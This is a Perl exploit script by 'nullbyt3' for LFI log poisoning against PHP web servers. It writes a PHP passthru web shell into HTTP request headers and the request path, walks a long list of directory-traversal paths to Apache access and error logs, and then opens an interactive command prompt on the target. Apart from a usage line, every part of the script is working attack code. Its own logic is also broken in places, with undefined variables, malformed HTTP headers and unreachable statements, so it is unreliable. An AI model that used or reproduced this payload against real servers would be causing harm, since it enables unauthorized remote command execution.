#!/usr/bin/perl
#by nullbyt3
use IO::Socket;
use LWP::UserAgent;
use Data::Dumper;
use warnings;
use strict;

my $ip = $ARGV[0];
my $path = $ARGV[1];

my $shellcode="<? passthru(\$_GET[cmd]) ?> "; 

my @logs = ("../../../../../../../etc/httpd/logs/error_log","../apache/logs/error.log..","/apache/logs/access.log",
     "../../apache/logs/error.log","../../apache/logs/access.log","../../../apache/logs/error.log",
     "../../../apache/logs/access.log","../../../../../../../etc/httpd/logs/acces_log",
     "../../../../../../../etc/httpd/logs/acces.log","../../../../../../../etc/httpd/logs/error_log",
     "../../../../../../../etc/httpd/logs/error.log","../../../../../../../var/www/logs/access_log",
     "../../../../../../../var/www/logs/access.log","../../../../../../../usr/local/apache/logs/access_ log",
     "../../../../../../../usr/local/apache/logs/access.log","../../../../../../../var/log/apache/access_log",
     "../../../../../../../var/log/apache2/access_log","../../../../../../../var/log/apache/access.log",
     "../../../../../../../var/log/apache2/access.log","../../../../../../../var/log/access_log",
     "../../../../../../../var/log/access.log","../../../../../../../var/www/logs/error_log",
     "../../../../../../../var/www/logs/error.log","../../../../../../../usr/local/apache/logs/error_log",
     "../../../../../../../usr/local/apache/logs/error.log","../../../../../../../var/log/apache/error_log",
     "../../../../../../../var/log/apache2/error_log","../../../../../../../var/log/apache/error.log",
     "../../../../../../../var/log/apache2/error.log","../../../../../../../var/log/error_log",
     "../../../../../../../var/log/error.log");

  if((!$ARGV[0]) or (!$ARGV[1])){
     usage();exit 1;
    }else{ 
    print "injecting the code via socket..\n";  
     foreach my $log (@logs){
     &sploit();

  }
  }
    print "\n\nlfi_shell!>";    
     my $cmd =<STDIN> ;
     chomp $cmd;
  if($cmd ne "exit") {
     &shell();

my $sock;
my $cmd;
  while (<$sock>){
   print $_,"\n";
    }
  }elsif($cmd eq "exit"){
    exit;
  print "bye!\n";
}else{
print "error, wtf?\n"; die;
}

sub sploit{
my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr => $ip, PeerPort => 80) or die $!;
print $sock "GET  $path.$shellcode HTTP/1.1\r\n";
print $sock "User-Agent: $shellcode";
print $sock "Host:  $ip";
print $sock "Accept:  */*";
print $sock "Referrer: $shellcode";
print $sock "Connection: close";
print $sock "Content-length:1028"
}

sub shell{
my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr => $ip, PeerPort => 80) or die $!;
my $log;
print $sock "GET  $path.$log.&cmd=$cmd HTTP/1.1\n\n\r\n";
print $sock "Host: $ip";
print $sock "User-Agent:$shellcode";
print $sock "Accept: */*";
print $sock "Referrer:$ip";
print $sock "Connection: keep-alive";
print $sock "Content-length:1028";
}

sub usage{
print "perl 0.pl 127.0.0.1 /vulnfile.php?page=\n"; 
}
